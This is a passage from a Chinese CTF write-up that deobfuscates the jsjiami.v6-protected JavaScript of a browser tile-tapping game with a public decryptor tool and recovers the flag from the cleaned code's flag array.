function_">_0x1d2e</span>(<span class="string">&#x27;4a&#x27;</span>)](_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4b&#x27;</span>)](<span class="built_in">parseInt</span>,_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4b&#x27;</span>)]($,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;46&#x27;</span>))[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]),<span class="number">0x6e</span>))&#123;<span class="keyword">if</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4d&#x27;</span>)!==<span class="string">&#x27;OJnvn&#x27;</span>)&#123;flag=_0x14c114[<span class="string">&#x27;soqNf&#x27;</span>](_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4e&#x27;</span>)](_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4f&#x27;</span>)](_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;50&#x27;</span>)](flag[<span class="number">0x8</span>],flag[<span class="number">0x6</span>]),flag[<span class="number">0x1</span>])+flag[<span class="number">0x7</span>],flag[<span class="number">0x5</span>])+flag[<span class="number">0x2</span>]+flag[<span class="number">0x0</span>]+flag[<span class="number">0x4</span>],flag[<span class="number">0x3</span>]);&#125;<span class="keyword">else</span>&#123;_0x14c114[<span class="string">&#x27;sbqYu&#x27;</span>](confirm,_0x14c114[<span class="string">&#x27;eWVDT&#x27;</span>]+_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;51&#x27;</span>)](<span class="built_in">parseInt</span>,_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;51&#x27;</span>)]($,<span class="string">&#x27;score&#x27;</span>)[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)])+_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;52&#x27;</span>)]+flag);&#125;&#125;<span class="keyword">else</span>&#123;<span class="keyword">if</span>(_0x14c114[<span class="string">&#x27;aAXDM&#x27;</span>]!==<span class="string">&#x27;EPoSk&#x27;</span>)&#123;_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;53&#x27;</span>)](confirm,_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;54&#x27;</span>)](<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;55&#x27;</span>)+<span class="built_in">parseInt</span>(_0x14c114[<span class="string">&#x27;ynrUN&#x27;</span>]($,_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;56&#x27;</span>)])[<span class="string">&#x27;innerHTML&#x27;</span>]),_0x14c114[<span class="string">&#x27;rbpXR&#x27;</span>]));&#125;<span class="keyword">else</span>&#123;<span class="keyword">return</span> <span class="variable language_">document</span>[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;0&#x27;</span>)](id);&#125;&#125;<span class="keyword">var</span> _0x35bf64=$(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;35&#x27;</span>));_0x35bf64[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]=<span class="string">&#x27;&#x27;</span>;$(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;46&#x27;</span>))[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]=<span class="number">0x0</span>;_0x35bf64[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;38&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;39&#x27;</span>)]=_0x14c114[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;57&#x27;</span>)];&#125;<span class="keyword">function</span> <span class="title function_">judge</span>(<span class="params">_0x545af0</span>)&#123;<span class="keyword">var</span> _0xf81cd5=&#123;<span class="string">&#x27;QNpbW&#x27;</span>:<span class="string">&#x27;score&#x27;</span>,<span class="string">&#x27;WjLha&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x2c32d9,_0x4db6b6</span>)&#123;<span class="keyword">return</span> _0x2c32d9+_0x4db6b6;&#125;,<span class="string">&#x27;vfRLA&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;55&#x27;</span>),<span class="string">&#x27;rhAgd&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x1892c7,_0x3c5fad</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x1892c7</span>(_0x3c5fad);&#125;,<span class="string">&#x27;LWTJm&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x563e3a,_0x40d179</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x563e3a</span>(_0x40d179);&#125;,<span class="string">&#x27;hbFUP&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x4658e5,_0x694647</span>)&#123;<span class="keyword">return</span> _0x4658e5+_0x694647;&#125;,<span class="string">&#x27;yLyYD&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x51620a,_0x1486d2</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x51620a</span>(_0x1486d2);&#125;,<span class="string">&#x27;xwcvM&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;58&#x27;</span>),<span class="string">&#x27;KRCVK&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x4ac062,_0x4ad8e7</span>)&#123;<span class="keyword">return</span> _0x4ac062!=_0x4ad8e7;&#125;,<span class="string">&#x27;PfsEX&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;30&#x27;</span>),<span class="string">&#x27;yhNxF&#x27;</span>:<span class="string">&#x27;OLkpt&#x27;</span>,<span class="string">&#x27;nDvCe&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x3f570c</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x3f570c</span>();&#125;&#125;;<span class="keyword">if</span>(_0x545af0[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;59&#x27;</span>)][<span class="string">&#x27;className&#x27;</span>][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5a&#x27;</span>)](_0xf81cd5[<span class="string">&#x27;xwcvM&#x27;</span>])==-<span class="number">0x1</span>&amp;&amp;_0xf81cd5[<span class="string">&#x27;KRCVK&#x27;</span>](_0x545af0[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;59&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5b&#x27;</span>)][<span class="string">&#x27;indexOf&#x27;</span>](_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5c&#x27;</span>)]),-<span class="number">0x1</span>))&#123;_0x545af0[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;59&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1f&#x27;</span>)][<span class="string">&#x27;pass1&#x27;</span>]=<span class="number">0x1</span>;&#125;<span class="keyword">if</span>(_0x545af0[<span class="string">&#x27;target&#x27;</span>][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5b&#x27;</span>)][<span class="string">&#x27;indexOf&#x27;</span>](<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;58&#x27;</span>))!=-<span class="number">0x1</span>)&#123;<span class="keyword">if</span>(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5d&#x27;</span>)!==_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5e&#x27;</span>)])&#123;_0x545af0[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;59&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5b&#x27;</span>)]=_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5c&#x27;</span>)];_0x545af0[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;59&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;1f&#x27;</span>)][<span class="string">&#x27;pass&#x27;</span>]=<span class="number">0x1</span>;_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;5f&#x27;</span>)](score);&#125;<span class="keyword">else</span>&#123;<span class="keyword">var</span> _0x22a3f1=<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;60&#x27;</span>)[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;61&#x27;</span>)](<span class="string">&#x27;|&#x27;</span>),_0x42aa57=<span class="number">0x0</span>;<span class="keyword">while</span>(!![])&#123;<span class="keyword">switch</span>(_0x22a3f1[_0x42aa57++])&#123;<span class="keyword">case</span><span class="string">&#x27;0&#x27;</span>:$(<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;46&#x27;</span>))[<span class="string">&#x27;innerHTML&#x27;</span>]=<span class="number">0x0</span>;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;1&#x27;</span>:<span class="keyword">if</span>(<span class="built_in">parseInt</span>($(_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;62&#x27;</span>)])[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)])&gt;<span class="number">0x6e</span>)&#123;<span class="title function_">confirm</span>(_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;63&#x27;</span>)](_0xf81cd5[<span class="string">&#x27;vfRLA&#x27;</span>],<span class="built_in">parseInt</span>(_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;64&#x27;</span>)]($,_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;62&#x27;</span>)])[<span class="string">&#x27;innerHTML&#x27;</span>]))+<span class="string">&#x27;\x20\x20\x20浣犵殑flag涓�&#x27;</span>+flag);&#125;<span class="keyword">else</span>&#123;_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;65&#x27;</span>)](confirm,_0xf81cd5[<span class="string">&#x27;hbFUP&#x27;</span>](<span class="string">&#x27;浣犵殑鏈€缁堝緱鍒哱x20&#x27;</span>,<span class="built_in">parseInt</span>(_0xf81cd5[<span class="string">&#x27;LWTJm&#x27;</span>]($,_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;62&#x27;</span>)])[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]))+<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;47&#x27;</span>));&#125;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;2&#x27;</span>:<span class="built_in">clearInterval</span>(clock);<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;3&#x27;</span>:<span class="keyword">var</span> _0x1cb1ea=_0xf81cd5[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;66&#x27;</span>)]($,<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;35&#x27;</span>));<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;4&#x27;</span>:_0x1cb1ea[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;38&#x27;</span>)][<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;39&#x27;</span>)]=<span class="string">&#x27;-408px&#x27;</span>;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;5&#x27;</span>:_0x1cb1ea[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]=<span class="string">&#x27;&#x27;</span>;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;6&#x27;</span>:result=![];<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;7&#x27;</span>:<span class="title function_">check_action</span>();<span class="keyword">continue</span>;&#125;<span class="keyword">break</span>;&#125;&#125;&#125;&#125;<span class="keyword">function</span> <span class="title function_">score</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x46c9a8=&#123;<span class="string">&#x27;umTQz&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x5f2b56,_0x242990</span>)&#123;<span class="keyword">return</span> _0x5f2b56+_0x242990;&#125;,<span class="string">&#x27;ARCNA&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xfad634,_0x337d72</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0xfad634</span>(_0x337d72);&#125;,<span class="string">&#x27;EzhLo&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x29f7e7,_0x5ac2d2</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x29f7e7</span>(_0x5ac2d2);&#125;,<span class="string">&#x27;CPlbK&#x27;</span>:<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;46&#x27;</span>),<span class="string">&#x27;nYpQm&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0xb5ea2e,_0x53a641</span>)&#123;<span class="keyword">return</span> _0xb5ea2e==_0x53a641;&#125;,<span class="string">&#x27;fnuqu&#x27;</span>:<span class="keyword">function</span>(<span class="params">_0x4b9f96</span>)&#123;<span class="keyword">return</span> <span class="title function_">_0x4b9f96</span>();&#125;&#125;;<span class="keyword">var</span> _0x1a84ef=_0x46c9a8[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;67&#x27;</span>)](<span class="built_in">parseInt</span>(_0x46c9a8[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;68&#x27;</span>)]($,<span class="string">&#x27;score&#x27;</span>)[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]),<span class="number">0x1</span>);_0x46c9a8[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;69&#x27;</span>)]($,_0x46c9a8[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;6a&#x27;</span>)])[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;4c&#x27;</span>)]=_0x1a84ef;<span class="keyword">if</span>(_0x46c9a8[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;6b&#x27;</span>)](_0x1a84ef%<span class="number">0xa</span>,<span class="number">0x0</span>))&#123;_0x46c9a8[<span class="title function_">_0x1d2e</span>(<span class="string">&#x27;6c&#x27;</span>)](speedup);&#125;&#125;;_0xodh=<span class="string">&#x27;jsjiami.com.v6&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这段代码又臭又长，但是在代码的前面已经提醒我们这里是经过jsjiami.v6加密过的，网上有直接的解密工具**<a target="_blank" rel="noopener" href="https://github.com/zhangyanlin2022/JsjiamiV6-Decryptor-1">JsjiamiV6-Decryptor</a>**，项目的README中有解释利用方法，直接根据该方法利用即可：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/62668ae9239250f7c599dac5.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/62668ae9239250f7c599dac5.png"></a></p>
<p>接下来直接查看解密之后的文件DecryptResult5.js：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">$</span>(<span class="params">_0x4c27d2</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(_0x4c27d2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">creatediv</span>(<span class="params">_0x1e165d</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x138beb=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">    _0x138beb.<span class="property">className</span>=_0x1e165d;</span><br><span class="line">    <span class="keyword">return</span> _0x138beb;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> clock=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> state=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> speed=<span class="number">6</span>;</span><br><span class="line"><span class="keyword">var</span> result=<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">var</span> flag=[<span class="string">&#x27;com&#x27;</span>,<span class="string">&#x27;aha_&#x27;</span>,<span class="string">&#x27;eat_&#x27;</span>,<span class="string">&#x27;!&#125;&#x27;</span>,<span class="string">&#x27;e_on&#x27;</span>,<span class="string">&#x27;re_gr&#x27;</span>,<span class="string">&#x27;rt&#123;h&#x27;</span>,<span class="string">&#x27;you_a&#x27;</span>,<span class="string">&#x27;sne&#x27;</span>];</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">start</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!result)&#123;</span><br><span class="line">        <span class="title function_">init</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;游戏已经开始，无需再次点击！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>)&#123;</span><br><span class="line">    result=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> _0x340b33=<span class="number">0</span>;_0x340b33&lt;<span class="number">4</span>;_0x340b33++)&#123;</span><br><span class="line">        <span class="title function_">createrow</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $(<span class="string">&#x27;main&#x27;</span>).<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params">_0x5abac5</span>)&#123;</span><br><span class="line">        _0x5abac5=(_0x5abac5||event);</span><br><span class="line">        <span class="title function_">judge</span>(_0x5abac5);</span><br><span class="line">    &#125;;</span><br><span class="line">    clock=<span class="variable language_">window</span>.<span class="built_in">setInterval</span>(<span class="string">&#x27;move()&#x27;</span>,<span class="number">30</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check_action</span>(<span class="params"></span>)&#123;</span><br><span class="line">    flag=((((flag[<span class="number">8</span>]+flag[<span class="number">6</span>])+flag[<span class="number">1</span>]+flag[<span class="number">7</span>])+flag[<span class="number">5</span>]+flag[<span class="number">2</span>])+flag[<span class="number">0</span>]+flag[<span class="number">4</span>]+flag[<span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createrow</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x3b3385=$(<span class="string">&#x27;con&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> _0x5afcef=<span class="title function_">creatediv</span>(<span class="string">&#x27;row&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> _0xf09bdd=<span class="title function_">createcell</span>();</span><br><span class="line">    _0x3b3385.<span class="title function_">appendChild</span>(_0x5afcef);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> _0xa4a713=<span class="number">0</span>;_0xa4a713&lt;<span class="number">4</span>;_0xa4a713++)&#123;</span><br><span class="line">        _0x5afcef.<span class="title function_">appendChild</span>(<span class="title function_">creatediv</span>(_0xf09bdd[_0xa4a713]));</span><br><span class="line">    &#125;<span class="keyword">if</span>(_0x3b3385.<span class="property">firstChild</span>==<span class="literal">null</span>)&#123;</span><br><span class="line">        _0x3b3385.<span class="title function_">appendChild</span>(_0x5afcef);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        _0x3b3385.<span class="title function_">insertBefore</span>(_0x5afcef,_0x3b3385.<span class="property">firstChild</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">delrow</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x13b8d4=$(<span class="string">&#x27;con&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(_0x13b8d4.<span class="property">childNodes</span>.<span class="property">length</span>==<span class="number">6</span>)&#123;</span><br><span class="line">        _0x13b8d4.<span class="title function_">removeChild</span>(_0x13b8d4.<span class="property">lastChild</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createcell</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x350dc0=[<span class="string">&#x27;cell&#x27;</span>,<span class="string">&#x27;cell&#x27;</span>,<span class="string">&#x27;cell&#x27;</span>,<span class="string">&#x27;cell&#x27;</span>];</span><br><span class="line">    <span class="keyword">var</span> _0x143001=<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">4</span>);</span><br><span class="line">    _0x350dc0[_0x143001]=<span class="string">&#x27;cell black&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> _0x350dc0;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">move</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x7d254e=$(<span class="string">&#x27;con&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> _0xcb4af7=<span class="built_in">parseInt</span>(<span class="variable language_">window</span>.<span class="title function_">getComputedStyle</span>(_0x7d254e,<span class="literal">null</span>).<span class="property">top</span>);</span><br><span class="line">    <span class="keyword">if</span>(speed+_0xcb4af7&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        _0xcb4af7=<span class="number">0</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        _0xcb4af7+=speed;</span><br><span class="line">    &#125;</span><br><span class="line">    _0x7d254e.<span class="property">style</span>.<span class="property">top</span>=_0xcb4af7+<span class="string">&#x27;px&#x27;</span>;</span><br><span class="line">    <span class="title function_">over</span>();</span><br><span class="line">    <span class="keyword">if</span>(_0xcb4af7==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="title function_">createrow</span>();</span><br><span class="line">        _0x7d254e.<span class="property">style</span>.<span class="property">top</span>=<span class="string">&#x27;-101px&#x27;</span>;</span><br><span class="line">        <span class="title function_">delrow</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">speedup</span>(<span class="params"></span>)&#123;</span><br><span class="line">    speed+=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(speed==<span class="number">20</span>)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;你超神了！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">over</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5d88ab=con.<span class="property">childNodes</span>;</span><br><span class="line">    <span class="keyword">if</span>(_0x5d88ab.<span class="property">length</span>==<span class="number">5</span>&amp;&amp;(_0x5d88ab[_0x5d88ab.<span class="property">length</span>-<span class="number">1</span>].<span class="property">pass</span>!==<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="title function_">fail</span>();</span><br><span class="line">    &#125;<span class="keyword">for</span>(<span class="keyword">let</span> _0x2f89b3=<span class="number">0</span>;_0x2f89b3&lt;_0x5d88ab.<span class="property">length</span>;_0x2f89b3++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(_0x5d88ab[_0x2f89b3].<span class="property">pass1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="title function_">fail</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fail</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(clock);</span><br><span class="line">    result=<span class="literal">false</span>;</span><br><span class="line">    <span class="title function_">check_action</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">parseInt</span>($(<span class="string">&#x27;score&#x27;</span>).<span class="property">innerHTML</span>)&gt;<span class="number">110</span>)&#123;</span><br><span class="line">        <span class="title function_">confirm</span>(<span class="string">&#x27;浣犵殑鏈€缁堝緱鍒哱x20&#x27;</span>+<span class="built_in">parseInt</span>($(<span class="string">&#x27;score&#x27;</span>).<span class="property">innerHTML</span>)+<span class="string">&#x27;   浣犵殑flag涓�&#x27;</span>+flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_">confirm</span>(<span class="string">&#x27;你的最终得分 &#x27;</span>+<span class="built_in">parseInt</span>($(<span class="string">&#x27;score&#x27;</span>).<span class="property">innerHTML</span>)+<span class="string">&#x27;   哈哈，就这水平还想拿flag？&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> _0x35bf64=$(<span class="string">&#x27;con&#x27;</span>);</span><br><span class="line">    _0x35bf64.<span class="property">innerHTML</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $(<span class="string">&#x27;score&#x27;</span>).<span class="property">innerHTML</span>=<span class="number">0</span>;</span><br><span class="line">    _0x35bf64.<span class="property">style</span>.<span class="property">top</span>=<span class="string">&#x27;-408px&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">judge</span>(<span class="params">_0x545af0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(_0x545af0.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;black&#x27;</span>)==-<span class="number">1</span>&amp;&amp;(_0x545af0.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;cell&#x27;</span>)!=-<span class="number">1</span>))&#123;</span><br><span class="line">        _0x545af0.<span class="property">target</span>.<span class="property">parentNode</span>.<span class="property">pass1</span>=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(_0x545af0.<span class="property">target</span>.<span class="property">className</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;black&#x27;</span>)!=-<span class="number">1</span>)&#123;</span><br><span class="line">        _0x545af0.<span class="property">target</span>.<span class="property">className</span>=<span class="string">&#x27;cell&#x27;</span>;</span><br><span class="line">        _0x545af0.<span class="property">target</span>.<span class="property">parentNode</span>.<span class="property">pass</span>=<span class="number">1</span>;</span><br><span class="line">        <span class="title function_">score</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">score</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x1a84ef=(<span class="built_in">parseInt</span>($(<span class="string">&#x27;score&#x27;</span>).<span class="property">innerHTML</span>)+<span class="number">1</span>);</span><br><span class="line">    $(<span class="string">&#x27;score&#x27;</span>).<span class="property">innerHTML</span>=_0x1a84ef;</span><br><span class="line">    <span class="keyword">if</span>(_0x1a84ef%<span class="number">10</span>==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="title function_">speedup</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这下代码就变得很简单易读了，我们可以直接通过flag的定义拿到flag</p>
